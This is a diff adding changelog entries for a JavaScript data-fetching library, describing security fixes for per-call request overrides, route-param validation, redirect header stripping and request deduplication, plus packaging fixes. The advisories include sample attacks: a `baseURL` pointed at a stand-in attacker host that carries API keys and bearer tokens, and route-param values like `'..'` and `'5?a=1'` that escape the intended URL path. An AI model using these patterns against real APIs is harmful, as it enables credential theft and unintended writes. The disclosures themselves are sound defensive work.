@@ -5,6 +5,287 @@ All notable changes to Minder Data Provider will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Security — per-call request options are now an ALLOWLIST, not a denylist (BREAKING)
+
+Adversarial re-probing found that `ApiClient`'s per-call `options` (the 4th argument to
+`apiClient.request()`; reachable from `useMinder()`'s `axiosConfig` and every CRUD/mutate helper)
+let a caller override axios options that control **where a request is sent or how it is physically
+transported** — `url`, `baseURL`, `proxy`, `adapter`, `transformRequest`/`transformResponse`,
+`httpAgent`/`httpsAgent`, `socketPath`. Live-wire-verified: a route's own declared secret header
+(e.g. a static `X-Api-Key`) or the caller's bearer token rode along to an attacker-controlled host
+supplied via any of these keys, with no throw. This was closed in two passes:
+
+- **Registered-route dispatch** (`ApiClient.request()`) now refuses all of the keys above with a
+  directed `MinderSecurityError` (`code: 'UNSAFE_REQUEST_OPTION_OVERRIDE'`) before assembling any
+  part of the outgoing request, and forwards only an explicit allowlist of vetted keys.
+- **The ad-hoc/raw path** (`ApiClient`'s internal `requestRaw`, reached whenever a route name is an
+  absolute URL, `rawUrl: true`, or an unregistered leading-`/` path — including through
+  `useMinder()`'s `axiosConfig`) had the **identical** unguarded spread, independently
+  reintroduced because the two dispatch paths built their own axios config separately. Both paths
+  now share one function (`extractCallerRequestOptions`) that performs the refusal/allowlist —
+  there is no longer a second, independently-maintained code path that could diverge from it.
+
+**Forwarded per-call keys (BREAKING — anything else is now silently dropped, not merely
+undocumented):** `timeout`, `signal`, `responseType`, `onUploadProgress`, `onDownloadProgress`,
+`withCredentials`, `validateStatus`, `paramsSerializer`, `decompress`. None of these can change a
+request's destination or transport. `axiosConfig`/per-call options claiming any other axios key
+(e.g. the `transformRequest` example previously — incorrectly — shown in `MinderOptions.axiosConfig`'s
+own doc comment) now either throws (`url`/`baseURL`/`proxy`/`adapter`/`transformRequest`/
+`transformResponse`/`httpAgent`/`httpsAgent`/`socketPath`/`beforeRedirect`) or is silently ignored
+(anything else not on the allowlist). Use the registry's `route.url`/`urlOverride` (a same-origin,
+path-only override) to change WHERE a registered route dispatches — never a per-call option.
+See [MIGRATION_GUIDE.md](./docs/MIGRATION_GUIDE.md#per-call-axios-options-are-now-an-allowlist) for
+a before/after.
+
+- **Cross-origin redirect header stripping (`sensitiveHeaders`) now also covers a custom
+  `config.auth.authHeader` and the CSRF header name**, not only a registered route's own declared
+  header names — a hand-configured auth header name other than the default `Authorization` was
+  previously a name axios/follow-redirects' own built-in stripping never covers. The ad-hoc/raw
+  path (`requestRaw`) now sets `sensitiveHeaders` too — it previously set none at all, even though
+  it dispatches through the same interceptor that attaches the same bearer token.
+- **GET-request deduplication's cache key now reflects the full dispatched request** (method, URL,
+  body, query params, and per-call headers), not only method+URL+body. Two concurrent GETs to the
+  same route differing only in `params` or only in a per-call header previously collapsed into a
+  single wire request and one caller silently received the other caller's response — a cross-tenant
+  disclosure risk under per-request auth. This is a pure bugfix (never intentional behavior) but is
+  called out here because it changes wire traffic volume: two previously-deduplicated-together GETs
+  that differ in a forwarded field now dispatch as two separate requests.
+
+### Security — standalone `minder()`'s per-call `baseURL` could also exfiltrate credentials (BREAKING)
+
+The allowlist fix above only covered dispatch through `ApiClient`/`<MinderDataProvider>`. A second
+adversarial pass on the standalone `minder(route, data, options)` function — which builds its
+outgoing request differently (hand-picked fields, not an axios-config spread) — found the same
+class of defect in that different shape: `minder('registeredRoute', undefined, { baseURL:
+'http://attacker' })` dispatched to the caller-supplied host carrying BOTH the route's own declared
+headers (e.g. a static `X-Api-Key`) and the ambient bearer token (`configureMinder()`/
+`minder.config()`), with no throw and `success: true` — while the legitimate host received zero
+requests. `createTypedMinder(...).minder()` (`src/core/typedRoutes.ts`) delegates straight into
+`minder()`, so it carried the same defect.
+
+- Standalone `minder()` now refuses to dispatch, with a `MinderSecurityError`-shaped error (`code:
+  'UNSAFE_REQUEST_OPTION_OVERRIDE'`), before assembling any part of the request, when a per-call
+  `baseURL` is combined with either a registered route's own declared `headers` or an ambient
+  bearer token. **`minder()` keeps its documented "never throws by default" contract: the call does
+  not throw** — it resolves with `{ success: false, error: { code: 'UNSAFE_REQUEST_OPTION_OVERRIDE',
+  ... } }`, exactly like any other refused/failed call. Pass `options.throwOnError: true` (the
+  existing opt-in every `minder()` call already supports) to get a real `throw` instead. A `baseURL`
+  override with **no** such ambient credential in play (e.g. an unregistered path, no configured
+  token) is unchanged and still dispatches as before.
+- `createTypedMinder(...).minder()` inherits the fix automatically (it only ever delegates to
+  `minder()` — no separate implementation to fix).
+- The doc comment on `MinderOptions.axiosConfig` that recommended `baseURL` as "the way to point a
+  standalone call at a different host" — directly beneath the explanation of why `axiosConfig`'s
+  own `baseURL` is refused — has been corrected; it no longer recommends the vulnerable pattern.
+  `MinderOptions.baseURL`'s own doc comment, `llms.txt`, and `docs/FEATURES.md` now say the same
+  thing consistently.
+- **Not changed, but now explicitly documented:** passing an absolute URL as the `route` argument
+  (`minder('https://third-party.example/x', ...)`, and the equivalent `apiClient.request(absoluteUrl,
+  ...)` on the provider path) remains a deliberate escape hatch that still attaches the ambient
+  bearer token to whatever host you name — see
+  [SECURITY_GUIDE.md](./docs/SECURITY_GUIDE.md#-per-call-destination-overrides-and-ambient-credentials-v22).
+
+See [MIGRATION_GUIDE.md](./docs/MIGRATION_GUIDE.md#minders-per-call-baseurl-now-refuses-to-redirect-credentials)
+for a before/after and migration steps.
+
+### Security — a hostile route-param value could escape the intended URL entirely (RELEASE BLOCKER, regression vs 2.1.4)
+
+Adversarial testing against a real `node:http` server (bare tarball install, no jsdom) found that
+`options.params` on the **standalone `minder()` path** was substituted into a registered route's
+`:param` URL-path segment with no validation at all:
+
+```typescript
+configureMinder({ apiUrl, routes: { updateUser: { url: '/users/:id', method: 'PUT' } } });
+await minder('updateUser', { name: 'attacker-controlled body' }, { params: { id: '..' } });
+// -> PUT / (the site root) — id: '..' collapses '/users/..' past '/users' via URL
+//    normalization, carrying the full body. Nothing throws; nothing is refused.
+```
+
+Also live-wire-verified: `id: '5#'` truncates to `/users/5` with the hostile remainder re-added as
+`?id=...` (a **different** real resource than intended); `id: '5?a=1'` truncates to `/users/5` with
+`a=1` merged in as a **live, attacker-controlled query param**; `id: ''` hits `/users/` (the
+collection) instead of being refused. None of these throw or are refused client-side — a real API
+with anything mounted at `/`, or a resource collision at the truncated path, would execute the
+write.
+
+Value-level hostile-id validation already existed for `operations.update`/`operations.delete` (26
+green wire cases proving zero requests reach the wire for `''`, `'..'`, `null`, `{}`, `'5#'`,
+`'5?a=1'`, and encoded traversal) — it was never applied to route-param substitution on the
+standalone `minder()` path. This is the **seventh** time this release that a guard existed on one
+dispatch path and a second path reached the same sink unguarded (after `urlOverride`,
+`options.url`, `options.baseURL`, `options.proxy`, `requestRaw`'s duplicate spread, and `minder()`'s
+`baseURL` above).
+
+- **Structural fix, not a fourth copy of the check:** `validateRouteParamValue`
+  (`src/core/apiClient/routeParamSafety.ts`) is now called from **inside**
+  `substituteUrlParams` (`resolveRequest.ts`) — the single, shared path-substitution function
+  `ApiClient.request`, `ApiClient.requestRaw`, **and** standalone `minder()` all already funnel
+  through. Every one of those three dispatch paths is protected by construction; a future fourth
+  path can only skip validation by not calling `substituteUrlParams` at all — which would mean it
+  never substitutes `:param` placeholders in the first place, a functional defect anyone would
+  notice immediately, not a silent security regression.
+- Refuses (before any request is assembled, `code: 'UNSAFE_ROUTE_PARAM_VALUE'`): `null`/`undefined`,
+  any non-string/number/bigint value, non-finite numbers (`NaN`/`Infinity`), an empty or
+  whitespace-only string, a value whose percent-escapes cannot be decoded, and any value containing
+  a path separator (`/`, `\`), a query/fragment delimiter (`?`, `#`), a control character, or a
+  `..` traversal sequence — raw or percent-encoded, single- or double-encoded.
+- `operations.update`/`operations.delete`'s own `assertValidResourceId` (`useMinder.helpers.ts`) now
+  delegates to the same `validateRouteParamValue` — there is exactly one hostile-route-param
+  detector in the codebase, not two that can drift apart at the next edit.
+- Legitimate params are unaffected: `{ id: 0 }`, `{ id: '007' }`, a UUID, and nested routes like
+  `/t/:id/comments` all still dispatch to the correct path.
+- **Negative control:** reverting this fix reproduces the leak exactly as described above (`PUT /`
+  for `id: '..'`) against a real server — confirmed, then the fix was restored.
+
+This is also a **regression we introduced**: on published 2.1.4 the identical call produced a
+literal, inert, broken `/updateUser?id=..` request that never escaped `/updateUser`. 2.2.0's
+route-template resolution fix unlocked this escape. See
+[MIGRATION_GUIDE.md](./docs/MIGRATION_GUIDE.md#minders-route-params-are-now-validated-before-url-substitution)
+for the before/after and migration steps.
+
+### Fixed — Next.js App Router could not build at all (`"use client"` demoted by code-splitting)
+
+Any App Router app that imported `minder` or `configureMinder` failed `next build` **and**
+`next dev`. tsup's `splitting: true` merged every `"use client"` source module into a shared
+lazy-init chunk, wrapping the module body in a function — so the directive became
+`var x = b(() => { "use client"; ... })`, an inert string expression rather than a module
+prologue. Next.js then treated client-only code as server code, surfacing as
+`TypeError: (0, n.useState) is not a function`.
+
+A post-build step (`scripts/fix-use-client-directive.mjs`, wired into `tsup.config.ts`'s
+`onSuccess`) now re-hoists the directive to each affected file's true first statement, and
+`tests/packaging/use-client-directive-position.test.ts` fails if `"use client"` ever appears
+anywhere other than a module's first statement again.
+
+Verified end to end against a real Next.js 15.5.24 App Router app installed from an actual
+`npm pack` tarball: a Server Component and a Route Handler importing `{ minder, configureMinder }`,
+plus a Client Component rendering `<MinderDataProvider>`/`useMinder`. `next build` passes under
+both webpack and `--turbopack`, and `next dev` serves HTTP 200. Negative control: reverting the
+build change puts the directive back at byte offset 368 and reproduces the crash.
+
+Note the `"use client"` wrapper pattern documented in `docs/NEXTJS_APP_ROUTER.md` is still the
+recommended approach — rendering `<MinderDataProvider>` directly in a Server Component still
+fails, but now via Next.js's ordinary client-boundary rule rather than a defect in this package.
+
+### Fixed — cross-origin redirect leaked route auth headers on the standalone `minder()` path
+
+A route's own secret header (e.g. `X-Api-Key`) rode along to the redirect target when a request
+was redirected cross-origin. The provider/`ApiClient` path already set axios's `sensitiveHeaders`;
+the standalone path set none. Both paths now derive that list from one shared helper
+(`src/core/apiClient/sensitiveHeaders.ts`), covering route headers plus the effective auth header
+name and the CSRF header name, so the two cannot diverge again. Proven by a wire case driving a
+real redirecting server and a real second host, asserting the secret never arrives.
+
+### Fixed — GET/mutation dedup cache key dropped function-valued and non-serializable options
+
+`ApiClient`'s in-flight-request dedup key was built with `JSON.stringify(requestConfig)`, which
+silently omits function-valued keys (`paramsSerializer`, `onUploadProgress`/`onDownloadProgress`)
+and serializes non-plain-object values (`URLSearchParams`, `FormData`) inconsistently — two
+concurrent `apiClient.request()` calls differing only in one of these could collapse into a single
+wire request, with the second caller silently receiving the first caller's response. The key is now
+built from an explicit list of every wire-affecting field (including non-serializable ones, keyed by
+identity/shape rather than `JSON.stringify`) instead of a blanket stringify with special cases
+bolted on. Not reachable through `useMinder()` (should-fix, not blocking), but closes the same
+divergence class as the two dedup fixes above.
+
+### Fixed — `fix-2.2.0-blockers` post-release matrix (2026-08-26)
+
+A 10-agent feature×framework matrix (15 features × 9 frameworks) re-tested the packed 2.2.0
+tarball on a bare install and found the entire-library-works-everywhere claim false — 5 defects
+reproduced identically across all nine frameworks against a real `node:http` server, because they
+live in shared core code, not framework glue. Two of the five were nearly missed a second time
+because most agents tested only the happy path; a failure-path re-test (dead port, refused
+request) caught both. Full evidence and root causes: [SUPPORT_MATRIX.md](./docs/product/SUPPORT_MATRIX.md).
+
+- **Provider-less `mutate()` reported success on a hard network failure** (`useMinder`'s standalone
+  mutate branch) and double-wrapped its result, violating the shipped `.d.ts`. Now propagates the
+  inner `minder()` result's real `success`/`data`/`error`/`status`.
+- **DELETE requests silently dropped their body** on the provider-less `minder()` path (both
+  shipped dist chunks), while still sending `content-type: application/json`. Only `GET` is now
+  excluded from body assembly; DELETE carries a body like every other non-GET method, matching the
+  provider/`ApiClient` path, which was already correct.
+- **Mounting a hook on a mutating route fired a real request on mount.** `useMinder("createUser")`,
+  where the route declares `POST`, previously issued a real `POST` with an empty body before any
+  `mutate()`/`operations` call. Auto-fetch is now suppressed whenever the resolved route/method
+  isn't `GET`.
+- **`operations.update(id)`/`operations.delete(id)` silently dropped the id** on any route not
+  following the `createX`/`updateX`/`deleteX` naming convention — `operations.delete(5)` could
+  produce a collection-shaped `DELETE /users` with no id, which is mass-delete-shaped. This now
+  throws a directed `CRUD_ID_PLACEHOLDER_MISSING` error instead. Also fixed: every `:id` route
+  appending a redundant `?id=` query string alongside the path-substituted id.
+- **Next.js App Router (and any fresh module graph with no prior provider mount) crashed** with
+  `TypeError: Cannot assign to read only property 'undefined' of object '#<Object>'` — a
+  cross-entry singleton key was computed at module-top-level and could be deferred by esbuild's
+  code-splitting past first access. This broke the README's zero-config `useMinder(url)`,
+  standalone `useAuthToken()`, and server-side `minder()`. Fixed at the singleton-store root cause.
+- **`transport: 'fetch'` was silently ignored under a `<MinderDataProvider>`.** The documented
+  edge escape hatch only ever worked on the standalone `minder()` path; `ApiClient` was hard-wired
+  to axios with no opt-out, so the entire Level-1 (`configureMinder` + provider) pattern could not
+  make a single request on bare Cloudflare workerd. `transport` is now a first-class
+  `MinderConfig`/`UnifiedMinderConfig` field, forwarded through to `ApiClient`, which dispatches
+  via native `fetch()` instead of axios when set explicitly or auto-detected on an edge runtime.
+- **React Native/Expo token persistence silently no-op'd.** The standalone, no-provider
+  `useAuthToken()` path (`GlobalAuthManager`) gated persistence on `typeof window !== 'undefined'`
+  — true on React Native, which aliases `window = global` — then called bare `localStorage`, which
+  doesn't exist there, so every `setToken`/`getToken` silently failed (a caught `ReferenceError`)
+  and tokens never survived a restart. Now does real functional feature-detection and falls back to
+  `StorageAdapterFactory.createWithFallback()` (AsyncStorage on RN, SecureStore on Expo). Adds a
+  new public `ready: Promise<void>` on `GlobalAuthManager` so native's async restore can be awaited
+  (additive, non-breaking).
+
+### Fixed — `dist/bundle-sizes.json` dropped from the tarball a SECOND time; README bundle numbers stale again
+
+`npx minder doctor --bundle` was found broken on a real bare install again, after being fixed once
+already (see the `files`-glob fix earlier in this file). Root-caused this time instead of re-adding
+a glob: the `files` glob was never the problem on this pass — `dist/bundle-sizes.json` was simply
+never *generated* before packing. Generation was wired only to the `prepublishOnly` npm lifecycle
+script, which **npm only ever runs for `npm publish`** — never for a bare `npm pack`. Since
+publishing is an owner-only manual step never run by CI or an agent (see `RELEASING.md`), every
+tarball actually produced and validated in this repo is built with `npm pack`, a command that never
+executed `prepublishOnly` and therefore never generated the file. Confirmed with a real (non-`--dry-run`,
+which skips lifecycle scripts entirely and cannot exercise this bug) `npm pack`: with the fix
+reverted, the packed tarball's only `.json` member was `package/package.json`; with the fix in
+place, `package/dist/bundle-sizes.json` is present.
+
+- **Fix:** `generate:bundle-sizes` is now also wired to `prepack` — the one npm lifecycle script
+  that fires for **both** `npm pack` and `npm publish` — so packing can no longer omit the file
+  regardless of which command produces the tarball. `prepublishOnly` keeps its own call too
+  (generation is idempotent, so running it twice on a real publish is harmless).
+- **Regression-proofed a third time:** `tests/packaging/bundle-sizes-packaging.test.ts` now deletes
+  `dist/bundle-sizes.json`, runs a REAL `npm pack` (not `--dry-run`), and asserts both that the file
+  reappears on disk and that the actual `tar` contents of the produced tarball include
+  `package/dist/bundle-sizes.json` — proving generation-at-pack-time, not just that an
+  already-existing file would be included. A companion structural test asserts `package.json`'s
+  `prepack` script exists and calls `generate:bundle-sizes`, so this can't silently regress a third
+  time by someone removing the hook. Negative control: reverting the `prepack` script line
+  reproduces both new test failures exactly, confirmed then restored.
+- **README "Bundle Cost" numbers were also stale again** (drift is expected — this same release
+  cycle added real bytes to every entry via the new route-param/request-option validation choke
+  points above) — re-measured against this build with the repo's own `npm run measure:bundles`
+  (`scripts/measure-bundles.mjs`, esbuild `0.25.12`, the version pinned in `package-lock.json`),
+  never copied from a prior figure or an external report: `hook` ~38.3 KB → **~48.0 KB**, `core`
+  ~43.4 KB → **~52.9 KB**, `. (main)` ~77.8 KB → **~83.0 KB**. The measurement methodology (what's
+  included/excluded and how to reproduce the numbers yourself) is now stated directly beside the
+  figures in the README instead of left implicit.
+
+### Known open defect — NOT fixed in this pass
+
+- **Offline auto-queue does not fire on a genuine network failure.** With `offline: { enabled:
+  true }` configured through a provider, a mutation that fails against a real dead port is simply
+  lost — `getOfflineManager().getQueueSize()` stays `0`. Root cause isolated to
+  `src/core/apiClient/errors.ts`'s `buildApiError`: axios sets `isAxiosError: true` even on
+  connection failures, so the axios-error branch intercepts every real failure before the code path
+  that calls `addToQueue()` is ever reached. Manual `getOfflineManager().addToQueue(...)` and
+  replay of already-queued items both work correctly — only the automatic enqueue-on-real-failure
+  step is broken. Prior documentation and an earlier changelog entry ("`onSync`/
+  `onConnectivityChange` now fire for REAL auto-queued failed requests") overstated this based on
+  a unit test that mocked the failure rather than causing a real one; that claim has been corrected
+  in [SUPPORT_MATRIX.md](./docs/product/SUPPORT_MATRIX.md), [docs/FEATURES.md](./docs/FEATURES.md),
+  and [docs/product/RELEASE_READINESS.md](./docs/product/RELEASE_READINESS.md). If you need offline
+  resilience today, call `addToQueue()` yourself from your own error handling.
+
 ## [2.2.0] - 2026-08-16 — ⚠️ carries the former v3.0 train, BREAKING inside a minor
 
 > **Owner decision (2026-07-22): the v3.0 branch merged into the beta line.** The
@@ -21,6 +302,153 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 > for a major bump. Every one is labeled under a BREAKING heading below. Consumers
 > pinned to `^2.1.4` will receive all of these on what npm treats as a routine minor
 > upgrade — **read docs/MIGRATION_GUIDE.md before upgrading.**
+
+### Fixed — `fix-2.2.0-blockers` (13-agent adversarial pre-publish validation)
+
+A 13-agent adversarial validation ran against the **packed tarball** (installed
+fresh into scratch consumer projects, never imported from `src/`) and found 19
+defects — 5 release-blockers, 6 high — none rejected by independent
+reproduction. Every one is fixed below, verified against the built package
+(a real HTTP server, a real packed-and-installed tarball, real `dist/*.mjs`
+namespace probes — not source-level unit tests, which is exactly how five of
+these blockers went undetected in the first place). None of these predate this
+effort's own detection; several existed before 2.2.0 but were only confirmed
+now.
+
+**⚠️ BREAKING changes in this set — read before upgrading, even on a routine
+`^2.1.4`/`^2.2.0-beta` install:**
+
+- **`cors`/`corsHelper` no longer auto-enables on web.** The `Platform.WEB`
+  default is now `{ enabled: false }` (previously `{ enabled: true,
+  credentials: false }`), and `configureMinder()` now **throws**
+  `CONFIG_CORS_PROXY_MISSING` at call time if you explicitly set
+  `enabled: true` without also setting `proxy` — instead of only warning, and
+  only in `NODE_ENV === 'development'`. Previously every request from an app
+  that never asked for CORS handling was silently rewritten to
+  `/api/minder-proxy/*`; in production, with no warning, that meant every
+  request 404ing against a route that doesn't exist. **If you were relying on
+  the old auto-enabled default**, set `corsHelper: { enabled: true, proxy:
+  '/your/proxy/route' }` explicitly. See docs/MIGRATION_GUIDE.md ("CORS
+  defaults").
+- **`@tanstack/react-query-devtools` is no longer auto-mounted or imported by
+  the library at all.** It was previously marked as an optional peer in
+  `package.json` but the root, `/hook`, `/core`, `/web`, `/nextjs`, `/native`,
+  `/expo`, and `/electron` entries all still reached a
+  statically-resolvable `import("@tanstack/react-query-devtools")` — so a real
+  install that correctly omitted this optional peer hard-failed module
+  resolution under Metro and esbuild. That import is removed entirely from
+  every main entry. A new **`minder-data-provider/devtools-rq`** subpath ships
+  in this release as the explicit, opt-in replacement — it is the only place
+  in the package that references `@tanstack/react-query-devtools`, and it is
+  never imported by any other entry point. Mount `<ReactQueryDevtools>`
+  yourself, in your own app code, using this entry:
+  ```tsx
+  import { ReactQueryDevtools } from 'minder-data-provider/devtools-rq';
+
+  {process.env.NODE_ENV !== 'production' && <ReactQueryDevtools initialIsOpen={false} />}
+  ```
+  It also exports `ReactQueryDevtoolsPanel` and an async
+  `loadReactQueryDevtools()` for code-split loading. Installing
+  `@tanstack/react-query-devtools` stays optional — importing this entry is
+  the opt-in; a consumer who never imports it never needs the peer at all.
+- **`useAuth()`'s legacy token-storage keys now throw instead of silently
+  reading `undefined`.** This corrects the undeclared breaking change already
+  called out above under "Owner decision" (the `useAuth`/`useAuthToken`
+  split): untouched v2.1.4 code destructuring `{ setToken, getToken,
+  clearAuth, isLoggedIn }` from the root `useAuth()` previously got
+  `undefined` for all four, failing with a generic `TypeError` only at the
+  first real call. `useAuth()`'s return value now carries non-enumerable
+  `setToken`/`getToken`/`clearAuth`/`isLoggedIn` accessors that throw a
+  directed `MinderError` (`USE_AUTH_LEGACY_ACCESSOR_REMOVED`) naming
+  `useAuthToken()` — the same silent break, converted into an actionable
+  message at the same call site. They are non-enumerable, so `{...useAuth()}`,
+  `JSON.stringify`, and `Object.keys` are unaffected; only an explicit
+  `.setToken`/`.getToken`/`.clearAuth`/`.isLoggedIn` access throws.
+- **`XSSSanitizer.sanitize()` now fails closed off-browser too, and the
+  weaker fallback is gone.** This supersedes the "fails closed if DOMPurify's
+  dynamic import hasn't resolved" entry in "Changed (BREAKING vs 2.1.x)"
+  below — that entry's closing claim ("Server-side sanitization is unaffected
+  — it keeps using `basicSanitize()` unconditionally") is now **false**.
+  `basicSanitize()` (the weaker regex-based fallback) has been deleted
+  entirely. `sanitize()` throws `SANITIZER_UNAVAILABLE` on **every** runtime
+  without a usable DOMPurify instance — a browser where the import hasn't
+  resolved or failed, and every non-browser runtime (`/node`, `/server`,
+  Next.js SSR), which never even attempts to load DOMPurify since it needs a
+  DOM. A security control that silently degrades instead of failing is
+  strictly worse than one that's visibly absent. There is also no public
+  `minder-data-provider/utils/security` subpath — that entry's cited import
+  path was never actually resolvable; `XSSSanitizer` is not part of the
+  public API (see docs/EXAMPLES.md "XSS Protection" for the supported
+  render-time pattern).
+- **Sanitization is now opt-in per field, not a blanket walk of every string
+  in the request body.** `security.sanitization: true` (or an object with no
+  `fields`) now constructs a working sanitizer but applies it to **nothing**
+  automatically. Previously, enabling `security.sanitization` HTML-entity-encoded
+  and stripped markup from every string in a request body by default —
+  corrupting ordinary user data with no opt-out (`"Tom & Jerry <3"` became
+  mangled; DOMPurify has no configuration that leaves `&` untouched). Configure
+  `security.sanitization: { enabled: true, fields: ['bio', 'comment'] }` to
+  sanitize only the fields you name; everything else passes through unchanged.
+  Sanitizing a request body was never a real XSS control — XSS defence belongs
+  at render time, not on data in flight to your API.
+- **`configureMinder` imported from `/web`, `/native`, or `/node` now resolves
+  to the real, routes-aware implementation**, not the `@deprecated`,
+  routes-blind function it silently fell back to before (whose own deprecation
+  warning told the caller to import the very thing they already imported).
+  If your app imported `configureMinder` from one of these three subpaths and
+  depended on the old function's specific (non-)behavior — it registered no
+  routes and only handled `baseURL`/`headers` — the routes you declare are now
+  actually registered.
+
+**Fixed, non-breaking:**
+
+- **`useMinder().mutate()` now sends the route's declared HTTP method, never
+  `GET` with a silently-dropped body.** Root cause: an `options.method` key
+  present with value `undefined` survived an object spread in `ApiClient.ts`
+  and overwrote the correct `route.method`, falling back to axios's own `GET`
+  default. Fixed for the hook read path, the mutate path, `mutate(data,
+  { method })` (previously silently discarded — only
+  `axiosConfig: { method }` survived), and `operations.create/update/delete`
+  (which now resolve declared `create${Name}`/`update${Name}`/`delete${Name}`
+  sibling routes instead of always hitting the base GET route). Verified with
+  a real HTTP server driving every documented call pattern against the packed
+  tarball (`npm run test:wire`) — not a mocked-axios unit test, which is
+  exactly what let this ship.
+- **Standalone `minder()` now honours `security.sanitization`.** Previously
+  the sanitizer was wired only into `ApiClient` (the `<MinderDataProvider>`
+  path) — `security.sanitization: true` combined with standalone `minder()`
+  was a silent no-op. `minder()` now constructs and applies the same
+  `XSSSanitizer`, subject to the opt-in-per-field scope-down above.
+- **`useAuthToken()`, `useCache()`, and `useCurrentUser()` no longer require a
+  `<MinderDataProvider>`.** They previously threw `"useMinderContext must be
+  used within MinderDataProvider"` at first render, contradicting this
+  library's own "no provider required" documentation. They now fall back to a
+  standalone token/cache manager outside a provider (a one-shot check, no live
+  subscription for `useAuthToken`; a process-local `CacheManager` for
+  `useCache` that does not share state with a provider mounted elsewhere).
+- **Client auth can no longer fail open on a bad token value.** `setToken()`
+  now rejects non-string, empty, `"undefined"`, and `"null"` values at write
+  time (throws instead of persisting them as the literal string `"undefined"`,
+  which previously read back as authenticated); `isAuthenticated()` also
+  rejects those same values if they were already persisted from before this
+  fix.
+- **`createCorsMiddleware` now rejects a `RegExp` origin or an array
+  containing `'*'` combined with `credentials: true`**, closing the same gap
+  the literal-`'*'` guard already covered. An origin array containing `'*'`
+  alone (no credentials) is now treated as a wildcard instead of emitting no
+  CORS headers at all.
+- **`npx minder doctor --bundle` now works on a real install.**
+  `dist/bundle-sizes.json` — the file `doctor --bundle` reads — was generated
+  by `prepublishOnly` but dropped by the `files` glob before packing, so it
+  was never actually inside the published tarball. `dist/**/*.json` is now
+  included, and `generate:bundle-sizes` fails loudly (instead of writing
+  nothing and exiting 0) if `dist/` doesn't exist yet.
+- **Bundle-size documentation now reflects real measurements**, not stale or
+  copied figures — see the README "Bundle Cost" section.
+- **`llms.txt` and the docs no longer reference `useMinderContextSafe` as
+  unexported** — it's exported from the package root, `/core`, `/web`,
+  `/native`, `/nextjs`, `/expo`, and `/electron` (not `/node`, which has no
+  React hooks, or `/hook`, a minimal legacy re-export).
 
 ### Removed (BREAKING vs 2.1.x)
 
@@ -106,13 +534,15 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   blocked in a browser — a strict CSP without script-src coverage for the chunk, an
   offline/flaky-network window, or a bundler that fails to code-split the chunk
   correctly — or when `sanitize()` is called before the sanitizer's `ready()`
-  promise has settled. **Migration:** catch `SANITIZER_UNAVAILABLE` around direct
-  `XSSSanitizer` usage (`minder-data-provider/utils/security`) and decide how your
-  app should degrade, or `await sanitizer.ready()` before your first `sanitize()`
-  call. `ApiClient`'s own sanitization path already awaits `ready()` internally, so
-  this only bites direct `XSSSanitizer` callers. Server-side sanitization
-  (`typeof window === 'undefined'`) is unaffected — it keeps using
-  `basicSanitize()` unconditionally, as before. See docs/MIGRATION_GUIDE.md.
+  promise has settled. `ApiClient`'s own sanitization path already awaits
+  `ready()` internally, so this only bites direct `XSSSanitizer` callers.
+  **Superseded above, in "Fixed — `fix-2.2.0-blockers`":** the closing claim
+  here that server-side sanitization "keeps using `basicSanitize()`
+  unconditionally, as before" is no longer true — `basicSanitize()` is
+  deleted and every non-browser runtime now fails closed too — and
+  `XSSSanitizer` was never reachable at `minder-data-provider/utils/security`
+  (no such subpath ever existed); see the entry above for the corrected
+  behavior and docs/MIGRATION_GUIDE.md for the current migration steps.
 
 ### Changed (mechanism — no public API change)
 
